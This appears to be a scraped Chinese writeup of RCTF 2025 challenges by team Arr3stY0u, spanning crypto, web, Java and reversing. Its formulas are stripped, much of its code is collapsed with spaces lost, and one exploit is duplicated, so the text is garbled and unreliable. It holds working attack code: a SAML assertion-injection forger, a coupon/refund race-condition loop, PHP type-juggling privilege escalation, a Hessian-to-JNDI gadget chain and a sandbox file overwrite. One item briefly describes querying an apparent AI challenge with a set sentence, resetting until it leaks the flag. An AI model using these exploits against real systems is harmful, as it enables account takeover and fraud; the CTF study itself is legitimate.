# 2025 RCTF writeup by Arr3stY0u

> 原文: https://www.ctfiot.com/282850.html
> ID: 282850

📢 战队招新

🎯 基础条件

良好的人品与学习态度

赛龄一年以上

放置个人博客或github地址（如果有）

需包含个人信息、教育经历、比赛经历、个人技能

比赛经验需标明个人产出占比不要只写奖项

个人技能需标明掌握的具体技术，trick

设

将用户 seed（此处为int.from_bytes(secret,'big')）缩放到：

再做一次幂模映射：

将的位填入 MT 状态：

第位（bit）作为mt[0]的最高位 bit31，其余 31 位为 0；

剩余位按 32 位小端拆成mt[1..623]。

预热（warm-up）：

常量WARM_UP = 2000；

调用__gmp_mt_recalc_buffer（相当于 twist）次；

设mti = WARM_UP % 624 = 128。

先按 MT19937 标准方式 twist + temper（32 位）；

然后gmp_urandomb_ui(self.gmp_state, 31)取其低 31 位，作为 31 比特随机整数返回。

选取时，有

如果我们让矩阵的元素个数为，则可以在一次交互中，完整观察到 warm-up 后 MT 的连续个 LSB。

；

。

twist 本质上是线性递推；

temper 由移位与按位与/异或构成；

取 LSB 是取最低一位。

记，；

则

为的 bit 变量；

为观测到的 LSB 序列；

是由 “seed2 -> mt[] -> twist/temper -> LSB” 组成的线性变换矩阵。

，视作整数；

，但，所以，且；

。

模数；

多项式次数；

种子上界，远小于。

；

；

令，，再检查

自定义哈希SuanHash，状态 128 位，分成：

upper：高 64 位（rate，参与输出）

lower：低 64 位（capacity）

每处理一个 16 字节数据块blk：

mixed = (upper||lower) ^ blk

s = AES_ECB_perm(mixed)（不可知密钥，但同一轮固定）

upper, lower = s_hi64, s_lo64

记last_low = mixed_lo64

挤出（squeeze）：需要 128 位摘要时，仅做 1 轮挤出：

填充：非空消息在末尾追加0x80，再补 0 直至 16 字节对齐；空消息直接是一整块0x80 00..00。

s0 = AES(cfg)是初始化后第一次置换得到的起始状态（未知但固定）

x = s0 ^ blk

y = AES(x)

第一条：M3 = blk1 || R

第二条：M4 = blk2 || (R ⊕ Δ)其中R是任意 16 字节（可固定全 0）。

两次单块（长度 15 字节 →msg||0x80恰好一块）如：

两次双块

单块探测必须保证消息总长 < 16 字节（例如 15 字节），这样 padding 后恰为一块；若长度=16，msg+0x80会多出第二块，不再是单块情形。

双块构造使用 32 字节原始消息，之后会自动再附加一块 padding（固定），这正是我们需要的情况：第二块后状态对齐 → padding 相同 → 最终挤出相同。

AES 密钥/种子完全未知也无妨：我们只利用了线性的“挤出”关系恢复 Δ；并未尝试求逆 AES。

确定性：每轮都能稳出碰撞，不存在概率成分或暴力搜索。

在多项式环上构造商环

随机生成两个稀疏多项式：

每个多项式有个不同指数；

指数从区间中采样；

系数都在，即二元稀疏多项式。

在中随机平移后得到

写文件：

hint = h[1] / h[0]（即，在中的元素）；

用

一段看起来很随机的多项式hint；

一段 AES-CTR 密文；

知道 flag 形如RCTF{...}

；

非零项个数（权重）约为，看上去近乎随机。

；

是二元稀疏多项式，权重为。

；

取；

则，满足唯一性条件。

设，；

初始化：

当时，做一轮扩展欧几里得：

结束后取：

都是权重为的二元稀疏多项式；

；

（从而）在中是单位，对来说意味着和没有公共因子。

；

与的非零项个数都等于；

（保证在商环中可逆）。

在 Sage 中用脚本枚举，每隔打印一次进度；

在时第一次命中所有条件；

得到：

，；

权重均为。

在商环中构造嵌入的元素；

遍历所有：

计算

计算

用AES.new(key=k_a, nonce=b"suanp01y", mode=AES.MODE_CTR)解密密文；

若明文中出现子串RCTF{且同时包含右花括号}，则认为找到 flag。

在时成功解出明文：

随机生成主密钥与用户密钥；

生成一个随机的配对密钥pairing_key ∈ GT；

使用一个基于配对的加密方案得到密文CT = (C1, C2, C3)；

用KDF(pairing_key)对FLAG做异或；

把所有参数和异或后的密文一起打印出来，然后只允许我们提交一次“修改后的密文”，返回对应共享密钥的KDF。

M = pairing_key为消息；

pk = e(g, h)^{axi}；

g是G1生成元，q = h1(id)。

C'_2 = (t + r)·g；

C'_3 = (t + r)·q；

C'_1 = M·pk^t·pk^r = M·pk^{t+r}。

从服务端得到原始 banner（包含pk与CT）；

利用公开参数对密文做重随机化，构造一个新的CT'，满足CT' ≠ CT但dec(sk, CT') = dec(sk, CT) = pairing_key；

把CT'发送给服务端的 Oracle；

服务端解密得到相同的pairing_key，再通过kdf导出和原来一致的对称密钥；

我们收到的就是原加密中使用的KDF(pairing_key)，再与encrypted_flag异或即可得到 flag。

在一个可重随机化的 ElGamal 风格方案上，构造了一个“单次解密 Oracle”，却只阻止了“完全相同的密文”；

由于重随机化密文具有相同明文，Oracle 实际上等价于给了我们对原始密文的解密结果。

从stdin读取一行 banner；

按|分割，取出：

pk_hex（第 3 段）；

h1_hex（第 4 段，对应h1(id)）；

c1_hex, c2_hex, c3_hex（第 5–7 段）；

使用common::parse_gt/parse_g1/parse_g2解析为群元素：

pk ∈ GT；

c1 ∈ GT；

c2 ∈ G1；

c3 ∈ G2；

q = h1(id) ∈ G2从h1_hex解析。

随机取一个非零r ∈ Fr：

若新旧三元组完全相同（理论上概率极低）则重试；

构造新的CT并通过hex_ct输出<C1'>|<C2'>|<C3'>。

用户类型设计

superadmin 判定逻辑

Auth::check()判断用户是否已登录。

Auth::type()返回当前用户的类型。

$user_types['admin']为整数0。

Auth::type() 返回值来源

user.type：整数型权限字段。

photo.type：图片的 MIME 类型（文本）。

Auth::type()返回的是背景图对应photo记录中的type字段（文本）。

对于没有背景图的用户，则是NULL（依然不是用户表的整数权限字段）。

控制当前用户的background_photo_id指向一张我们上传的图片；

控制这张图片对应photo.type在数据库中为"-1"，从而满足比较条件。

如何控制 photo.type

$files['type'][$i]来自于 multipart 表单中该文件 part 的Content-Type头。

isValidImage($file)仅使用：

文件名后缀（扩展名）

文件大小

getimagesize($file['tmp_name'])检查是否真的是图片

不会对file['type']做任何格式校验或限制。

上传一张真正的 PNG/JPEG 图片（保证getimagesize能通过）；

但在该文件的 part 上，把Content-Type字段随意设置，例如"-1"；

这样数据库中这张图片记录的photo.type就是我们指定的"-1"。

设置背景图以触发错误 JOIN

使用了 CSRF token 校验，但 token 是通过Auth::generateCSRFToken()存在$_SESSION['csrf_token']里，值在整个会话中保持不变，我们可以从任意一个页面（如/register）解析出来后重复使用。

Photo::belongsToCurrentUser($photoId, Auth::id())实际函数签名只接受一个参数，多余参数会被 PHP 忽略，因此权限检查仍然是“当前登录用户是否拥有这张照片”，逻辑是安全的，但没有帮助到我们提升“真实权限”。

PHP 类型转换与比较

Auth::type()返回字符串"-1"（来自photo.type）。

比较一个字符串和一个整数时，字符串会先尝试解析为数字；

"-1"被转换为整数-1；

admin类型为0，即$user_types['admin'] = 0；

注册并登录一个新账号

访问/register，解析页面里的隐藏字段csrf_token。

向/api/register提交表单（username、email、password、confirm_password、csrf_token），成功后即处于登录状态。

上传一张 MIME 类型为 “-1” 的图片

使用多部分表单向/api/photos/upload发起请求。

文件字段名为photos[]。

文件内容使用题目自带的default-avatar.png，确保是合法图片。

但在该 part 的Content-Type头部手动设置为-1。

上传成功后，响应 JSON 中返回该图片的photo_id。

将这张图片设置为当前用户的背景图

使用之前获取的 CSRF token 和photo_id，向/api/user/background发送 POST 请求：

photo_id = <刚刚上传的图片 id>csrf_token = <从 /register 页面解析出的 token>

后端会将当前用户的background_photo_id更新为此图片。

随后，User::findById()就会 LEFT JOIN 这条 photo 记录，使得Auth::type()返回photo.type = "-1"。

访问 superadmin 页面拿 flag

保持同一会话（同一个 Cookie），直接访问/superadmin.php。

由于此时：

条件成立，页面返回的就是 flag 内容。

前端只有登录、注册和一个只有admin可见的 Debug 面板（文件下载）。

前端通过GET /api/get_aes_key拿到一个AES_KEY，然后用前端的CryptoJS完成对{username, password}的加密，再 POST 到/api/login或/api/register。

Debug 面板在页面上通过GET /api/debug?option=read_file&filename=...下载任意文件，但服务端会校验是否为admin。

使用/api/get_aes_key拿到 AES key。

按照前端的 CryptoJS 协议在 Python 中实现encrypt_raw和登录数据加密。

对用户admin进行小字典爆破，自动找到弱口令123321。

登录后利用 Debug 接口批量下载：

composer.json/composer.lock

config/routes.php

config/autoload/databases.php

.env

app/Controller/*.php

app/Common/Response.php

storage/database.db

利用aes_encrypt/aes_decrypt进一步验证 AES 协议与 Laravel 加密实现一致，并确认aes_decrypt分支确实会对解密结果做unserialize()。

async def main(orderId, couponId): global newOrderId tasks = [asyncio.create_task(refund(orderId)), asyncio.create_task(buy())] results = await asyncio.gather(*tasks) foriteminresults: if(item and item.get("data")): newOrder = item.get("data").get("order") ifnewOrder: newOrderId = newOrder.get("id") print("newOrderId:", newOrderId)def loopExp(): print("n") global productId global newOrderId global couponId global headers burp0_url = f"{HOST}/api/coupon/available" ifnot couponId: couponInfo = requests.get(burp0_url, headers=headers, proxies=PROXIES).json() if(couponId or (couponInfo.get("code") == 200 and len(couponInfo.get("data")) > 0 and (not couponInfo.get("data")[0].get("isUsed")))): ifnot couponId: couponId = couponInfo.get("data")[0].get("id") orderInfo = createOrder(couponId, productId) if(orderInfo and orderInfo.get("code") == 200 and orderInfo.get("data")): orderId = orderInfo.get("data").get("order").get("id") print("orderId:", orderId) asyncio.run(main(orderId, couponId)) burp0_url =f"{HOST}/api/order/my" orderCheck = requests.get(burp0_url, headers=headers).json() orderRefund = 0 orderComplete = 0 iforderCheck.get("code") == 200: foriteminorderCheck.get("data"): ifitem.get("status") =="COMPLETED": orderComplete += 1 elifitem.get("status") =="REFUNDED": orderRefund += 1 print({"orderComplete": orderComplete,"orderRefund": orderRefund}) else: print("ERROR CHECK?????") exit() ifnewOrderId: burp0_url = f"{HOST}/api/order/refund/{newOrderId}" requests.post(burp0_url, headers=headers) newOrderId = None burp0_url = f"{HOST}/api/user/info" userInfo = requests.get(burp0_url, headers=headers).json() if(userInfo.get("code") == 200 and userInfo.get("data")): balance = userInfo.get("data").get("balance") print("balance:", balance) iffloat(balance) < 4.2: print("No more money. Failed!!") elif(float(balance) < (28.5 + 10)): if(float(balance) <= 10): productId ="550e8400-e29b-41d4-a716-446655440003" elif(float(balance) <= 14.2): productId ="550e8400-e29b-41d4-a716-446655440001" elif(float(balance) <= 19.7): productId ="550e8400-e29b-41d4-a716-446655440002" elif(float(balance) <= 28.5): productId ="550e8400-e29b-41d4-a716-446655440004" loopExp() else: print("SUCCESS!!") global username global password print("username:", username) print("password:", password) exit() else: print("Can't get user info") print(orderInfo) exit() else: print("Can't create order") else: print("No coupon??") print(couponInfo) exit()

com.caucho.hessian.io.Hessian2Input#readObject() java.util.TreeMap#put java.util.TreeMap#compare com.rctf.server.tool.Maybe#compareToorg.springframework.beans.factory.support.AutowireUtils.ObjectFactoryDelegatingInvocationHandler#invokeorg.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean.TargetBeanObjectFactory#getObject org.springframework.jndi.support.SimpleJndiBeanFactory#getBean(java.lang.String) org.springframework.jndi.support.SimpleJndiBeanFactory#getBean(java.lang.String, java.lang.Class<T>) org.springframework.jndi.JndiLocatorSupport#lookup(java.lang.String, java.lang.Class<T>) org.springframework.jndi.JndiTemplate#lookup(java.lang.String) javax.naming.Context#lookup(java.lang.String)

身份提供方（IdP）：http://auth.rctf.rois.team/

服务提供方（SP / Flag 站）：http://auth-flag.rctf.rois.team:26000/

IdP 是一个 Node.js + MySQL 的统一身份认证中心，负责用户注册、登录、发放 SAML 断言。

SP 是一个 Flask 应用，通过解析并验证 SAML Response 来建立本地会话。

Flag 站只有管理员（admin@rois.team）登录后才能访问/admin拿到 flag。

GET SP_BASE + '/saml/login'，拿到 302 跳转中的SAMLRequest，重写 Host 到IDP_BASE，访问 IdP/saml/sso。

从 IdP 登录页面中提取隐藏字段samlRequest、relayState，向IDP_BASE + '/login'提交用户名和密码完成登录。

登录成功后 IdP 渲染saml_post.ejs，脚本解析其中：

<form ... action="ACS_URL">：SP 的 SAML ACS 地址。

<input name="SAMLResponse" value="...">：base64 编码的原始 SAML Response。

使用lxml解析解码后的 XML，调用inject_malicious_assertion：

definject_malicious_assertion(saml_response_b64: str, admin_email: str)-> str: xml_bytes = base64.b64decode(saml_response_b64) parser = etree.XMLParser(resolve_entities=False, no_network=True) root = etree.fromstring(xml_bytes, parser) ns = { "samlp":"urn:oasis:names:tc:SAML:2.0:protocol", "saml":"urn:oasis:names:tc:SAML:2.0:assertion", } assertions = root.xpath("//saml:Assertion", namespaces=ns) first_assertion = assertions[0] saml_ns = ns["saml"] malicious = etree.Element(f"{{{saml_ns}}}Assertion") subject = etree.SubElement(malicious,f"{{{saml_ns}}}Subject") nameid = etree.SubElement(subject,f"{{{saml_ns}}}NameID") nameid.text = admin_email parent = first_assertion.getparent() idx = parent.index(first_assertion) parent.insert(idx, malicious) new_xml = etree.tostring(root, encoding="utf-8", xml_declaration=False) returnbase64.b64encode(new_xml).decode()

将注入后的SAMLResponse通过 POST 提交到重写过 Host 的ACS_URL，建立伪装的管理员会话。

访问SP_BASE + '/admin'，打印返回内容，即为 flag。

Video ID

Code Revision

Name-pronunciation URL

Donation address

固定使用 seedstoic honest oracle创建魔像。

在审讯阶段直接用上面的单句向魔像提问，只占用 1/5 的轮数。

如果回复中没有出现RCTF{...}形式的字符串，则重置会话重新来过。

在本地初始化 Sui 测试环境；

发布题目合约包challenge（包含vault和vault_coin模块）；

接收选手提交的solution.mv，发布为solution包；

调用solution::solution::solve；

使用合约challenge::vault::has_flag检查选手是否成功获得Flag对象，若通过则输出 flag。

全局空投白名单的写权限（&mut AirdropTracker）；

全局金库的写权限（&mut Vault）；

该币种的增发权（&mut TreasuryCap<VAULT_COIN>）。

发现点

内容

结论

PE32 (Console)

基础信息。

经验证，此字符串不能作为最终 Flag。

紧邻诱饵字符串，是程序用于定位关键数据的魔数。

密钥指针 (ptr)：运行时指向静态诱饵字符串flag:{Th1sflaglsG00ds}的首地址。

修改下标 (idx)：用于确定在密钥串的哪个位置进行修改。

机制

修改位置 (idx)

原始字节

修正后的字节

作用

8

(0x69)

将Th1s改为This

14

(0x49)

将flagls改为flagIs

17

(0x6f)

将G00ds改为Goods

18

(0x6f)

将G00ds改为Goods

原始密钥 (诱饵)

RC4 相关函数

0x4017d0：初始化S[i] = i，然后用[key_ptr .. key_ptr+0x7F]做 RC4 KSA（key 长度参数为 0x80，循环中以i % 0x80取 key 字节）。

0x4018a0：标准 RC4 PRGA 流水线，对长度 0x80 的缓冲区做就地异或。

栈上密文构造


```
> I think SageMath copies everything from Python, right? 🤔FROM sagemath/sagemath:10.7nc 1.14.196.78 42101题目附件：
```



```
secret = os.urandom(64)set_random_seed(int.from_bytes(secret,'big'))mod, nrow, ncol = map(int, input().split())nbits = (mod -1).bit_length()ifnbits * nrow * ncol >19937: exit()outs = random_matrix(Zmod(mod), nrow, ncol).list()print("🤖 Machine output:", outs)guess = bytes.fromhex(input("🤔 secret (hex): ").strip())ifguess == secret: print(f"🎉 Correct! Here is your flag:{FLAG}")
```



```
cpdef set_random_seed(seed=None): global_current_randstate _current_randstate = randstate(seed)
```



```
if seed: mpz_init(mpz_seed) mpz_set_pylong(mpz_seed, seed) gmp_randseed(self.gmp_state, mpz_seed) mpz_clear(mpz_seed)
```



```
cdef randstate rstate = current_randstate()cdef int p = <int>self.p # p = modif not nonzero: if density == 1: for i from 0 <= i < self._nrows*self._ncols: self._entries[i] = rstate.c_random() % p
```



```
MOD2 = (ZZ(1) <<19937) -20023E = ZZ(0x40118124)phi = MOD2 -1g = gcd(E, phi) # 12E1 = E // gphi1 = phi // gD1 = E1.inverse_mod(phi1)
```



```
fromshared.small_roots.howgrave_grahamimportmodular_univariatePR.<x> = PolynomialRing(ZZ)f = x^12- CX =2^513forminrange(2,7): fortinrange(1,6): forrootsinmodular_univariate(f, MOD2, m, t, X): # roots 是 {x: root} 或 (root,) 形式 ...
```



```
secret_bytes = int(seed).to_bytes(64,'big', signed=False)secret_hex = secret_bytes.hex()
```



```
> I thought I was testing thehash… but maybe thehashwas testing me.nc 1.14.196.78 42103题目附件：
```



```
out_hi64 = cur_hi64 # 直接取当前 upperout_lo64 = last_low64 ^ cur_lo64 # 上轮混合低64 与 当前低64 异或H = out_hi64 || out_lo64
```



```
H = hi64(y) || (lo64(x) ^ lo64(y))
```



```
hi64(H1) ^ hi64(H2) = hi64(y1) ^ hi64(y2)lo64(H1) ^ lo64(H2) = (lo64(x1) ^ lo64(y1)) ^ (lo64(x2) ^ lo64(y2)) = lo64(x1 ^ x2) ^ lo64(y1 ^ y2) = lo64(blk1 ^ blk2) ^ lo64(y1 ^ y2) # 因 x = s0 ^ blk
```



```
Δ_hi64 = hi64(H1) ^ hi64(H2)Δ_lo64 = lo64(blk1 ^ blk2) ^ lo64(H1) ^ lo64(H2)Δ = Δ_hi64 || Δ_lo64 = y1 ^ y2
```



```
s1^(1) = y1, s1^(2) = y2
```



```
in2^(1) = s1^(1) ^ R = y1 ^ Rin2^(2) = s1^(2) ^ (R ^ Δ) = y2 ^ (R ^ (y1 ^ y2)) = y1 ^ R # 相等！
```



```
msg1 = 00..00 (15 个 0) => blk1 = 00..00 || 0x80msg2 = 00..00 01 (14 个 0 + 01) => blk2 = 00..00 01 || 0x80
```



```
R = 任意 16B（可全 0）M3 = blk1 || RM4 = blk2 || (R ^ Δ)
```



```
#!/usr/bin/env python3# -*- coding: utf-8 -*-frompwnimport*importre, time# 安静模式，避免刷屏；只打印我们的进度与最终 flagcontext.log_level ="error"HOST, PORT ="1.14.196.78",42103TOTAL_ROUNDS =500# 题面 20*25# ----------------- 工具函数 -----------------defbxor(a: bytes, b: bytes)-> bytes: returnbytes(x ^ yforx, yinzip(a, b))defrecv_hash_line(p, to=8)-> bytes: """ 读取到形如 'H = <32 hex>' 的行并返回 16B 哈希；容忍中间有杂音 """ end = time.time() + to buf =b"" whiletime.time() < end: try: line = p.recvline(timeout=max(0.2, end - time.time())) exceptEOFError: raise ifnotline: continue buf += line m = re.search(rb'Hs*=s*([0-9a-fA-F]{32})', buf) ifm: returnbytes.fromhex(m.group(1).decode()) raiseTimeoutError("timeout waiting for hash line")defwait_prompt(p, token: bytes, to=6): """ 等待输出里出现 token（非正则），忽略杂音 返回 True/False；遇 EOF 直接抛异常，由上层处理 """ end = time.time() + to buf =b"" whiletime.time() < end: try: chunk = p.recv(timeout=max(0.2, end - time.time())) exceptEOFError: raise ifchunk: buf += chunk iftokeninbuf: returnTrue returnFalsedefdrain_until_keywords(p, to=8): """ 扫到本轮的结语，返回 (tag, acc) tag ∈ {b"FLAG", b"NEXT", b"OVER", b"EOF", b""} """ end = time.time() + to acc =b"" whiletime.time() < end: try: line = p.recvline(timeout=max(0.2, end - time.time())) exceptEOFError: returnb"EOF", acc ifnotline: continue acc += line ifb"flag"inaccorb"RCTF{"inacc: returnb"FLAG", acc ifb"Next round"inacc: returnb"NEXT", acc ifb"Game over"inacc: returnb"OVER", acc returnb"", acc # 超时未见关键词defread_flag_after_done(p, to=8): """ 500/500 后读取最终输出直到 flag 或 EOF 返回 True(拿到) / False(未拿到) """ end = time.time() + to acc =b"" whiletime.time() < end: try: chunk = p.recv(timeout=max(0.2, end - time.time())) exceptEOFError: break ifnotchunk: continue acc += chunk ifb"flag"inaccorb"RCTF{"inacc: print(acc.decode(errors="ignore"), end="") # 再尝试读残留 try: rest = p.recv(timeout=1) ifrest: print(rest.decode(errors="ignore"), end="") except: pass returnTrue ifb"Game over"inacc: print(acc.decode(errors="ignore"), end="") returnFalse returnFalse# ----------------- 主逻辑 -----------------defmain(): whileTrue: # 连接；失败则重试 try: p = remote(HOST, PORT) exceptExceptionase: print(f"[!] connect error:{e}; retrying in 1s") time.sleep(1) continue # 吃掉首屏到第一轮（容错） try: p.recvuntil(b"[Round 1]", timeout=5) exceptException: pass # 固定两条“探测单块”：长度 15 -> 单块= msg||0x80 msg1_15 =b"x00"*15 msg2_15 =b"x00"*14+b"x01" blk1 = msg1_15 +b"x80" blk2 = msg2_15 +b"x80" R =b"x00"*16# 碰撞阶段第二块固定用 0^16，另一条用 R^Delta done =0 t0 = time.time() print("Running… target 500 rounds") try: whileTrue: # --- 等待本轮 MSG 1 提示 --- try: wait_prompt(p,b"MSG 1 (hex):", to=6) exceptEOFError: raise# 连接被关：交给外层重连 # Q1: 发 msg1_15（单块 = blk1） p.sendline(msg1_15.hex().encode()) h1 = recv_hash_line(p) # Q2: 发 msg2_15（单块 = blk2） wait_prompt(p,b"MSG 2 (hex):", to=6) p.sendline(msg2_15.hex().encode()) h2 = recv_hash_line(p) # 由 h = hi(E(x)) || (lo(x) ^ lo(E(x))) 恢复 Δ = E(x1)^E(x2) hi1, lo1 = h1[:8], h1[8:] hi2, lo2 = h2[:8], h2[8:] Delta = bxor(hi1, hi2) + bxor(bxor(blk1[8:], blk2[8:]), bxor(lo1, lo2)) # 两条双块（第二块相差 Δ） M3 = blk1 + R M4 = blk2 + bxor(R, Delta) # Q3 wait_prompt(p,b"MSG 3 (hex):", to=6) p.sendline(M3.hex().encode()) _ = recv_hash_line(p) # Q4 wait_prompt(p,b"MSG 4 (hex):", to=6) p.sendline(M4.hex().encode()) # 扫这一轮的结语 tag, acc = drain_until_keywords(p, to=8) iftag ==b"FLAG": print(acc.decode(errors="ignore"), end="") try: rest = p.recv(timeout=1) ifrest: print(rest.decode(errors="ignore"), end="") except:pass p.close() return iftag ==b"OVER": print("Game over (unexpected). Reconnecting…") break # tag in {b"", b"EOF"} 也认为成功，继续计数 done +=1 # ✅ 到达 500/500：进入收旗模式，不再等待下一轮 MSG 提示 ifdone >= TOTAL_ROUNDS: # 服务端会先打印 "Next round."，随后给 flag 并断开 # 我们此处直接把后续输出读出来 got = read_flag_after_done(p, to=10) p.close() return # 进度提示（每 20 轮或约 1.5 秒打印一次） ifdone %20==0: dt = time.time() - t0 spd = done / max(1e-6, dt) print(f"Progress:{done}/{TOTAL_ROUNDS} ~{spd:.1f}r/s") # 内层 while 跳出（例如 Game over），尝试重连 try: p.close() except:pass print("[*] reconnecting after interruption…") time.sleep(0.5) continue exceptEOFError: # 连接被远端关闭：自动重连 try: p.close() except:pass print("[*] connection closed by remote; reconnecting…") time.sleep(0.5) continueif__name__ =="__main__": main()
```



```
> NTRU over GF(2)?题目附件：
```



```
X^xxxx + X^yyyy + ...
```



```
RCTF{i_just_h0pe_ChatGPT_doesnt_inst@ntly_so1ve_thi5_one.}
```



```
> A perfectly modern design: Rust on top, pairings underneath, security everywhere.nc 1.14.196.78 42601题目附件：
```



```
ifc1_q == ct.c1 && c2_q == ct.c2 && c3_q == ct.c3 { println!("no"); return;}
```



```
letr = random_non_zero_scalar();letdelta_g1 = G1Projective::generator() * r;letdelta_q = q * r;letc2_new = c2 + delta_g1;letc3_new = c3 + delta_q;letc1_new = c1 * pk.pow(r.into_bigint());
```



```
Try to root my MaxKB.FROM 1panel/maxkb:v2.3.1COPY flag /root/flag Credential is default: admin / MaxKB@123..Online Environment: 👉Click Here👈 ⚠ Notice: A 503 page means the service is still being created — pleasewaitpatiently. The environment is heavy — may 3-5 minutes to start. Make sure yourlocalattack works first!
```



```
defruncmd(): withopen("/opt/maxkb-app/sandbox/sandbox.so","rb")asf: data = f.read() returndata
```



```
defruncmd(): withopen("/opt/maxkb-app/sandbox/sandbox.so","wb")asf: a=""".d..a..t..a...""" f.write(a) return1
```



```
importosos.popen("ls")
```



```
Wells, who loves photography, built a photography website.But it seems only the superadmin can get the flag.I thought the highest permission was admin—sowheredoes this superadmin come from?Online Environmenthttp://1.95.160.41:26000http://1.95.160.41:26001http://1.95.160.41:26002Notice:The online environment will be reset at 00 and 30 minutes of every hour, including the database.题目附件：
```



```
'user_types'=> [ 'admin'=>0, 'auditor'=>1, 'user'=>2],...'default_value'=> [ 'user'=> [ 'avatar_url'=>'/assets/img/default-avatar.png', 'type'=>2, 'level'=>1 ]]
```



```
$default_value = config('default_value.user');$userData = [ ... 'type' => $data['type'] ?? $default_value['type'], 'level'=> $data['level'] ?? $default_value['level'], ...];
```



```
$user_types = config('user_types');if(Auth::check() && Auth::type() < $user_types['admin']) { echogetenv('FLAG') ?:'RCTF{test_flag}';}
```



```
classAuth{ privatestatic$user =null; publicstaticfunctioninit(){ if(session_status() === PHP_SESSION_NONE) { session_name(config('session.name')); session_start(); } if(isset($_SESSION['user_id'])) { self::$user = User::findById($_SESSION['user_id']); } } publicstaticfunctiontype(){ returnself::$user['type']; }}
```



```
publicstaticfunctionfindById($userId){ returnDB::table('user') ->leftJoin('photo','user.background_photo_id','=','photo.id') ->where('user.id','=', $userId) ->first();}
```



```
CREATETABLEIFNOTEXISTS"photo"("id"TEXT,"user_id"TEXTNOTNULL,"post_id"TEXTDEFAULTNULL,"saved_filename"TEXTNOTNULL,"original_filename"TEXTNOTNULL,"type"TEXT, ...);CREATETABLEIFNOTEXISTS"user"("id"TEXT, ..."type"INTEGERDEFAULT0,"level"INTEGERDEFAULT1, ...);
```



```
publicfunctionupload(){ if(!Auth::check()) { json(['success'=>false,'message'=>'Not logged in'],401); } ... $file = [ 'name' => $files['name'][$i], 'type' => $files['type'][$i], 'tmp_name'=> $files['tmp_name'][$i], 'error' => $files['error'][$i], 'size' => $files['size'][$i] ]; if(!isValidImage($file)) { continue; } ... $result = Photo::create([ 'user_id' => Auth::id(), 'original_filename'=> $file['name'], 'saved_filename' => $savedFilename, 'type' => $file['type'], 'size' => $file['size'], ... ]);
```



```
publicfunctionsetBackground(){ if(!Auth::check()) { json(['success'=>false,'message'=>'Not logged in'],401); } $photoId = $_POST['photo_id'] ??''; $csrfToken = $_POST['csrf_token'] ??''; if(!Auth::verifyCSRFToken($csrfToken)) { json(['success'=>false,'message'=>'Invalid request'],403); } if(!empty($photoId) && !Photo::belongsToCurrentUser($photoId, Auth::id())) { json(['success'=>false,'message'=>'Photo not found']); } $result = User::update(Auth::id(), [ 'background_photo_id'=> $photoId ?:null ]); ...}
```



```
if(Auth::check() && Auth::type() < $user_types['admin']) { ...}
```



```
photo_id = <刚刚上传的图片 id>csrf_token = <从 /register 页面解析出的 token>
```



```
RCTF{h4rd_70_54y_wh37h3r_175_4_bu6_0r_4_f347ur3}
```



```
The administrator of hyperfun,a system developed using Hyperf, temporarily forgot their password — even though the password was really weak… Pleasehelphim recover the password and steal his secrets!题目提示：1、FROM hyperf/hyperf:8.3-alpine-v3.19-swoole；2、Try to locate suspicioussourcecode.；3、You may find inspirationinthe “Core Architecture” section at https://hyperf.wiki；4、chown root:root /opt/www/storage && chmod 555 /opt/www/storage；
```



```
Hey guys! I’m Potatowo. I recently heard that the supermarket downstairs launched a new shopping website, and I somehow got hold of itssourcecode. Let’s team up to milk itforfreebies!The attachments can be downloaded via the following two optional links.https://pan.baidu.com/s/1FqS9W4aTgwxRX2i2XKbSWw?pwd=8y32https://drive.google.com/file/d/1_Rd8KkeH9hhIjuTdayrD2SpZdfl3bHpg/view?usp=sharing
```



```
async def main(orderId, couponId): global newOrderId tasks = [asyncio.create_task(refund(orderId)), asyncio.create_task(buy())] results = await asyncio.gather(*tasks) foriteminresults: if(item and item.get("data")): newOrder = item.get("data").get("order") ifnewOrder: newOrderId = newOrder.get("id") print("newOrderId:", newOrderId)def loopExp(): print("n") global productId global newOrderId global couponId global headers burp0_url = f"{HOST}/api/coupon/available" ifnot couponId: couponInfo = requests.get(burp0_url, headers=headers, proxies=PROXIES).json() if(couponId or (couponInfo.get("code") == 200 and len(couponInfo.get("data")) > 0 and (not couponInfo.get("data")[0].get("isUsed")))): ifnot couponId: couponId = couponInfo.get("data")[0].get("id") orderInfo = createOrder(couponId, productId) if(orderInfo and orderInfo.get("code") == 200 and orderInfo.get("data")): orderId = orderInfo.get("data").get("order").get("id") print("orderId:", orderId) asyncio.run(main(orderId, couponId)) burp0_url =f"{HOST}/api/order/my" orderCheck = requests.get(burp0_url, headers=headers).json() orderRefund = 0 orderComplete = 0 iforderCheck.get("code") == 200: foriteminorderCheck.get("data"): ifitem.get("status") =="COMPLETED": orderComplete += 1 elifitem.get("status") =="REFUNDED": orderRefund += 1 print({"orderComplete": orderComplete,"orderRefund": orderRefund}) else: print("ERROR CHECK?????") exit() ifnewOrderId: burp0_url = f"{HOST}/api/order/refund/{newOrderId}" requests.post(burp0_url, headers=headers) newOrderId = None burp0_url = f"{HOST}/api/user/info" userInfo = requests.get(burp0_url, headers=headers).json() if(userInfo.get("code") == 200 and userInfo.get("data")): balance = userInfo.get("data").get("balance") print("balance:", balance) iffloat(balance) < 4.2: print("No more money. Failed!!") elif(float(balance) < (28.5 + 10)): if(float(balance) <= 10): productId ="550e8400-e29b-41d4-a716-446655440003" elif(float(balance) <= 14.2): productId ="550e8400-e29b-41d4-a716-446655440001" elif(float(balance) <= 19.7): productId ="550e8400-e29b-41d4-a716-446655440002" elif(float(balance) <= 28.5): productId ="550e8400-e29b-41d4-a716-446655440004" loopExp() else: print("SUCCESS!!") global username global password print("username:", username) print("password:", password) exit() else: print("Can't get user info") print(orderInfo) exit() else: print("Can't create order") else: print("No coupon??") print(couponInfo) exit()
```



```
Very simple, a guaranteed score.The attachments can be downloaded via the following two optional links.https://pan.baidu.com/s/1TbOwosM1E-Pe1mr7PqhzZQ?pwd=ti6ahttps://drive.google.com/file/d/1YVevxgAjfTwqfqiujzIxvtZkOwp4ZeIs/view?usp=sharingOnline Environment: 👉Click Here👈 ⚠ Notice: A 503 page means the service is still being created — pleasewaitpatiently.
```



```
